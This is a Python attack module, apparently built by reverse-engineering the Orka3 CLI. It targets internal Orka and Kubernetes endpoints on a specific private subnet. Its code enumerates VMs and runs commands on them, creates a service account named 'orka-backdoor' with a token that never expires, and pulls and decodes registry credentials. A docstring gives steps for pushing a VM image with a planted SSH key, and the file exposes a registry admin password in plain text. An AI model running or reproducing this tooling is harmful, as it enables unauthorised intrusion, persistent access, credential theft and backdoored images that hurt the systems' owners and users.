"""
orka_vm_exec_re.py — Orka3 VM execution + SA token persistence attack module.

Reconstructed from: /home/cowboy/VDT/tools/orka3/orka3 (77MB Go ELF, go1.25.7)

=== vmiexec package (macstadium.com/orka-go/pkg/vmiexec) ===
The vmiexec package implements virsh command execution on Orka hypervisor nodes.

Symbols extracted:
  vmiexec.ExecuteVirshCommand      — execute virsh (KVM management) on hypervisor
  vmiexec.executor                 — executor struct
  vmiexec.(*executor).Exec         — send exec request to Orka API
  vmiexec.(*executor).getExecRequestURL — build URL: /api/v1/namespaces/{ns}/vms/{name}/exec
  vmiexec.vmActions                — map of supported VM actions
  vmiexec.vmCommandDescriptor      — per-command metadata
  vmiexec.vmState                  — VM state machine (running/stopped/etc)
  vmiexec.NewExecutor              — executor factory

=== serviceaccount package ===
  serviceaccount.createServiceAccountToken   — request K8s SA token
  serviceaccount.createTokenWithNoExpiration — request SA token with no TTL (!!)
  serviceaccount.createServiceAccount        — create new SA
  serviceaccount.deleteServiceAccount        — delete SA

=== registrycredential package ===
  registrycredential.addCredentials    — store Docker registry credentials in Orka
  registrycredential.listServers       — list configured registry servers
  registrycredential.removeCredentials — remove stored credentials
  orka-go/pkg/regcred.AuthConfig       — Docker auth config struct
  orka-go/pkg/regcred.(*AuthConfig).Encode — base64 Docker auth encoding
  Field: Insecure json:"insecure,omitempty"

=== VM management commands ===
  vm.deployVM          — deploy a new VM from config
  vm.createVM          — create VM config
  vm.deleteVm          — delete VM
  vm.executeCommand    — execute command in VM (via vmiexec)
  vm.commitImage       — commit VM image changes
  vm.saveImage         — save VM image state
  vm.resizeImage       — resize VM disk image
  vm.vmPush            — push VM image to registry
  vm.nameVM            — assign name to VM
  vm.waitForVM         — poll until VM reaches target state
  vm.validateCredentials — validate auth before VM operations

=== vm_config package ===
  vm_config.createVmConfig — create VirtualMachineConfig CRD
  vm_config.deleteVmConfig — delete VirtualMachineConfig CRD
  Field: vmcCreateExample  — help text with example config (exposes schema)

=== Attack Chains ===

Chain A — VM RCE via vmiexec (internal access required):
  1. Forge admin JWT (orka_oidc_re.forge_admin_token)
  2. GET /api/v1/cluster-info → base_oauth_endpoint
  3. GET /api/v1/namespaces/orka-default/vms → enumerate VMs
  4. POST /api/v1/namespaces/{ns}/vms/{name}/exec
     body: {"command": "virsh list --all"} → hypervisor shell
  5. virsh domifaddr <vmname> → get VM IP
  6. virsh console <vmname> → macOS VM shell

Chain B — SA token persistence (K8s cluster):
  1. Forge admin JWT
  2. POST /api/v1/namespaces/orka-default/serviceaccounts → create new SA
  3. POST /api/v1/namespaces/orka-default/serviceaccounts/<new-sa>/token
     body: {expirationSeconds: null} → NO EXPIRY token
  4. Token saved as new K8s credential → permanent cluster access

Chain C — Registry credential extraction:
  1. Forge admin JWT
  2. GET /api/v1/namespaces/orka-default/registrycredentials → list
  3. Response contains Docker auths (base64 user:pass) for all configured registries
  4. Pull any internal macOS VM image → extract image layers → find secrets

Chain D — VM image backdoor:
  1. Forge admin JWT
  2. Harbor registry at 10.221.188.5:30080 — admin:p@ssw0rd
  3. Docker pull internal VM base image
  4. Add backdoor layer (SSH key, reverse shell)
  5. Docker push → overwrite image in Harbor
  6. vm.deployVM with modified image → backdoored macOS VM

=== K8s SA Token Request API ===
URL: /api/v1/namespaces/{ns}/serviceaccounts/{sa}/token
Method: POST
Body:
{
  "apiVersion": "authentication.k8s.io/v1",
  "kind": "TokenRequest",
  "spec": {
    "audiences": [],
    "expirationSeconds": null   # null = no expiry (createTokenWithNoExpiration)
  }
}
"""

import base64
import json
import ssl
import urllib.error
import urllib.parse
import urllib.request
from typing import Optional

# ── Constants (fill locally from orka3 binary + kubeconfig) ────────────────

ORKA_API_BASE    = 'http://10.221.188.20'
ORKA_API_OLD     = 'http://10.221.188.100'
K8S_API          = 'https://10.221.188.19:6443'
HARBOR_HOST      = 'http://10.221.188.5:30080'
HARBOR_USER      = 'admin'
HARBOR_PASS      = 'FILL_IN_LOCALLY'  # from binary help text

ORKA_DEFAULT_NS  = 'orka-default'

# Fill locally from orka_oidc_re.forge_admin_token()
ADMIN_TOKEN      = 'FILL_IN_LOCALLY'

# ── API Route Map (extracted from orka3 binary) ──────────────────────────────

ROUTES = {
    'cluster_info':         '/api/v1/cluster-info',
    'vms':                  '/api/v1/namespaces/{ns}/vms',
    'vm_detail':            '/api/v1/namespaces/{ns}/vms/{name}',
    'vm_exec':              '/api/v1/namespaces/{ns}/vms/{name}/exec',
    'vm_push_status':       '/api/v1/namespaces/{ns}/vms/{name}/pushbytes',
    'sa_list':              '/api/v1/namespaces/{ns}/serviceaccounts',
    'sa_token':             '/api/v1/namespaces/{ns}/serviceaccounts/{sa}/token',
    'regcreds':             '/api/v1/namespaces/{ns}/registrycredentials',
    'images':               '/api/v1/namespaces/{ns}/images',
    'isos':                 '/api/v1/namespaces/{ns}/isos',
    'nodes':                '/api/v1/nodes',
    'vm_configs':           '/api/v1/namespaces/{ns}/vmconfigs',
}


def _http(method: str, url: str, token: Optional[str] = None,
          body: Optional[dict] = None, timeout: int = 8) -> dict:
    """Generic HTTP helper for Orka/K8s API calls."""
    headers = {'Accept': 'application/json', 'Content-Type': 'application/json'}
    if token:
        headers['Authorization'] = f'Bearer {token}'

    data = json.dumps(body).encode() if body else None
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    result = {'url': url, 'status': None, 'body': None, 'error': None}
    try:
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            result['status'] = r.status
            raw = r.read().decode('utf-8', errors='replace')
            result['body_raw'] = raw[:8192]
            try:
                result['body'] = json.loads(raw)
            except json.JSONDecodeError:
                result['body'] = raw[:2048]
    except urllib.error.HTTPError as e:
        result['status'] = e.code
        try: result['error'] = e.read().decode('utf-8', errors='replace')[:500]
        except: result['error'] = str(e)
    except Exception as e:
        result['error'] = str(e)[:200]
    return result


def _orka_url(route_key: str, ns: str = ORKA_DEFAULT_NS,
              name: str = '', sa: str = '',
              api_base: str = ORKA_API_BASE) -> str:
    path = ROUTES[route_key].format(ns=ns, name=name, sa=sa)
    return api_base + path


# ── Chain A: VM Enumeration + Exec ─────────────────────────────────────────

def list_vms(token: str = ADMIN_TOKEN,
             ns: str = ORKA_DEFAULT_NS,
             api_base: str = ORKA_API_BASE) -> dict:
    """
    GET /api/v1/namespaces/{ns}/vms
    Requires admin JWT. Returns all running VMs in namespace.
    """
    url = _orka_url('vms', ns=ns, api_base=api_base)
    return _http('GET', url, token=token)


def exec_vm_command(vm_name: str, command: list,
                    token: str = ADMIN_TOKEN,
                    ns: str = ORKA_DEFAULT_NS,
                    api_base: str = ORKA_API_BASE) -> dict:
    """
    POST /api/v1/namespaces/{ns}/vms/{name}/exec
    Executes command in VM via vmiexec.Exec / ExecuteVirshCommand.
    command: list of strings, e.g. ['virsh', 'list', '--all']
    """
    url = _orka_url('vm_exec', ns=ns, name=vm_name, api_base=api_base)
    body = {'command': command}
    return _http('POST', url, token=token, body=body)


def exec_virsh_list(token: str = ADMIN_TOKEN, ns: str = ORKA_DEFAULT_NS,
                    api_base: str = ORKA_API_BASE) -> dict:
    """virsh list --all via vmiexec.ExecuteVirshCommand."""
    return exec_vm_command('', ['virsh', 'list', '--all'], token, ns, api_base)


def probe_vm_exec_surface(token: str = ADMIN_TOKEN, ns: str = ORKA_DEFAULT_NS,
                           api_base: str = ORKA_API_BASE) -> dict:
    """
    Full Chain A:
    1. List all VMs
    2. For each running VM, attempt exec with id + hostname commands
    """
    result = {'vms': [], 'exec_results': []}

    list_r = list_vms(token, ns, api_base)
    result['list_response'] = list_r

    if list_r.get('body') and isinstance(list_r['body'], (dict, list)):
        items = list_r['body'] if isinstance(list_r['body'], list) else \
                list_r['body'].get('items', [])
        for item in items[:10]:
            vm_name = item.get('metadata', {}).get('name', '') or item.get('name', '')
            if not vm_name:
                continue
            result['vms'].append(vm_name)
            for cmd in [['id'], ['hostname'], ['uname', '-a'], ['ls', '/Users']]:
                r = exec_vm_command(vm_name, cmd, token, ns, api_base)
                result['exec_results'].append({
                    'vm': vm_name,
                    'cmd': cmd,
                    'status': r.get('status'),
                    'output': str(r.get('body', ''))[:500],
                })

    return result


# ── Chain B: SA Token Persistence ──────────────────────────────────────────

def create_service_account_token(sa_name: str,
                                  token: str = ADMIN_TOKEN,
                                  ns: str = ORKA_DEFAULT_NS,
                                  no_expiry: bool = True,
                                  k8s_base: str = K8S_API) -> dict:
    """
    POST /api/v1/namespaces/{ns}/serviceaccounts/{sa}/token
    Mirrors orka3 createServiceAccountToken / createTokenWithNoExpiration.
    no_expiry=True → expirationSeconds: null → permanent token
    """
    url = k8s_base + ROUTES['sa_token'].format(ns=ns, sa=sa_name)
    body = {
        'apiVersion': 'authentication.k8s.io/v1',
        'kind': 'TokenRequest',
        'spec': {
            'audiences': [],
            'expirationSeconds': None if no_expiry else 86400,
        },
    }
    return _http('POST', url, token=token, body=body)


def create_persistent_sa(sa_name: str = 'orka-backdoor',
                          token: str = ADMIN_TOKEN,
                          ns: str = ORKA_DEFAULT_NS,
                          k8s_base: str = K8S_API) -> dict:
    """
    Create a new K8s service account + request a non-expiring token.
    Full SA persistence chain.
    """
    url = k8s_base + ROUTES['sa_list'].format(ns=ns)
    sa_body = {
        'apiVersion': 'v1',
        'kind': 'ServiceAccount',
        'metadata': {'name': sa_name, 'namespace': ns},
    }
    create_r = _http('POST', url, token=token, body=sa_body)
    token_r = create_service_account_token(sa_name, token, ns, True, k8s_base)
    return {
        'sa_create': create_r,
        'token_request': token_r,
        'persistent_token': token_r.get('body', {}).get('status', {}).get('token'),
    }


# ── Chain C: Registry Credential Extraction ────────────────────────────────

def list_registry_credentials(token: str = ADMIN_TOKEN,
                                ns: str = ORKA_DEFAULT_NS,
                                api_base: str = ORKA_API_BASE) -> dict:
    """
    GET /api/v1/namespaces/{ns}/registrycredentials
    Returns Docker auth configs for all configured registries.
    orka-go/pkg/regcred.AuthConfig → base64 user:pass
    """
    url = _orka_url('regcreds', ns=ns, api_base=api_base)
    r = _http('GET', url, token=token)

    # Decode any base64 auth fields found
    decoded = []
    body = r.get('body')
    if isinstance(body, (list, dict)):
        items = body if isinstance(body, list) else body.get('items', [body])
        for item in items:
            auths = item.get('spec', {}).get('auths', {}) or item.get('auths', {})
            for server, auth_data in auths.items():
                if isinstance(auth_data, dict) and 'auth' in auth_data:
                    try:
                        decoded_auth = base64.b64decode(auth_data['auth']).decode()
                        user, password = decoded_auth.split(':', 1)
                        decoded.append({
                            'server': server,
                            'user': user,
                            'password': password,
                        })
                    except Exception:
                        decoded.append({'server': server, 'raw_auth': auth_data['auth']})

    r['decoded_credentials'] = decoded
    return r


def probe_harbor_api(token: str = ADMIN_TOKEN,
                     harbor_base: str = HARBOR_HOST) -> dict:
    """
    Probe Harbor registry API with admin creds.
    Lists projects, repositories, and artifacts (VM images).
    Fill HARBOR_PASS locally (extracted from orka3 binary help text).
    """
    results = {}
    creds = base64.b64encode(f'{HARBOR_USER}:{HARBOR_PASS}'.encode()).decode()
    auth_header = f'Basic {creds}'

    for path, key in [
        ('/api/v2.0/projects', 'projects'),
        ('/api/v2.0/repositories', 'repositories'),
        ('/api/v2.0/users', 'users'),
        ('/api/v2.0/systeminfo', 'systeminfo'),
    ]:
        url = harbor_base + path
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            req = urllib.request.Request(
                url,
                headers={'Authorization': auth_header, 'Accept': 'application/json'},
            )
            with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                results[key] = {'status': r.status, 'body': json.loads(body) if body else {}}
        except urllib.error.HTTPError as e:
            results[key] = {'status': e.code, 'error': str(e)}
        except Exception as e:
            results[key] = {'error': str(e)[:100]}

    return results


# ── Chain D: VM Image Backdoor (documentation only) ───────────────────────

BACKDOOR_CHAIN_DOC = """
Chain D — VM Image Backdoor (requires Docker + VPN + HARBOR_PASS)

Prerequisites:
  - Harbor at http://10.221.188.5:30080 reachable
  - Harbor credentials: admin:FILL_IN_LOCALLY (from orka3 binary)
  - Docker installed locally

Steps:
  1. docker login http://10.221.188.5:30080 -u admin -p HARBOR_PASS
  2. docker pull 10.221.188.5:30080/<project>/<base-image>
  3. Create backdoor Dockerfile:
       FROM 10.221.188.5:30080/<project>/<base-image>
       RUN echo '<authorized_key>' >> /Users/admin/.ssh/authorized_keys
  4. docker build -t 10.221.188.5:30080/<project>/<base-image>:backdoor .
  5. docker push 10.221.188.5:30080/<project>/<base-image>:backdoor
  6. orka3 vm deploy --vm-config <config> --image <base-image>:backdoor
     → deploys macOS VM with SSH key backdoor

Result: persistent SSH access to macOS VM on MacStadium hardware.
"""


# ── Enumeration Suite ───────────────────────────────────────────────────────

def probe_api_surface(token: str = ADMIN_TOKEN,
                      ns: str = ORKA_DEFAULT_NS,
                      api_base: str = ORKA_API_BASE) -> dict:
    """Enumerate all Orka API endpoints with admin token."""
    results = {}
    probe_routes = {
        'cluster_info': '/api/v1/cluster-info',
        'vms': f'/api/v1/namespaces/{ns}/vms',
        'vm_configs': f'/api/v1/namespaces/{ns}/vmconfigs',
        'images': f'/api/v1/namespaces/{ns}/images',
        'isos': f'/api/v1/namespaces/{ns}/isos',
        'nodes': '/api/v1/nodes',
        'regcreds': f'/api/v1/namespaces/{ns}/registrycredentials',
        'serviceaccounts': f'/api/v1/namespaces/{ns}/serviceaccounts',
    }
    for key, path in probe_routes.items():
        url = api_base + path
        results[key] = _http('GET', url, token=token)
    return results


def run_full_attack_chain(token: str = ADMIN_TOKEN,
                           api_base: str = ORKA_API_BASE,
                           k8s_base: str = K8S_API) -> dict:
    """
    Full attack chain:
      A: VM enumeration + exec probe
      B: SA token persistence
      C: Registry credential extraction
    Requires VPN access to 10.221.188.x subnet.
    Fill token locally from orka_oidc_re.forge_admin_token().
    """
    print('[orka_vm_exec_re] Chain A: API surface enum...')
    api_surface = probe_api_surface(token, api_base=api_base)

    print('[orka_vm_exec_re] Chain A: VM exec probe...')
    vm_exec = probe_vm_exec_surface(token, api_base=api_base)

    print('[orka_vm_exec_re] Chain B: SA token persistence...')
    sa_token = create_service_account_token('default', token, k8s_base=k8s_base)

    print('[orka_vm_exec_re] Chain C: Registry credential extraction...')
    regcreds = list_registry_credentials(token, api_base=api_base)

    return {
        'api_surface': api_surface,
        'vm_exec': vm_exec,
        'sa_token_persistence': sa_token,
        'registry_credentials': regcreds,
        'backdoor_chain_doc': BACKDOOR_CHAIN_DOC,
    }


if __name__ == '__main__':
    import sys
    if '--api' in sys.argv:
        print(json.dumps(probe_api_surface(), indent=2, default=str))
    elif '--vms' in sys.argv:
        print(json.dumps(list_vms(), indent=2, default=str))
    elif '--sa-token' in sys.argv:
        print(json.dumps(create_service_account_token('default'), indent=2, default=str))
    elif '--regcreds' in sys.argv:
        print(json.dumps(list_registry_credentials(), indent=2, default=str))
    elif '--harbor' in sys.argv:
        print(json.dumps(probe_harbor_api(), indent=2, default=str))
    elif '--backdoor-doc' in sys.argv:
        print(BACKDOOR_CHAIN_DOC)
    else:
        print(json.dumps(run_full_attack_chain(), indent=2, default=str))
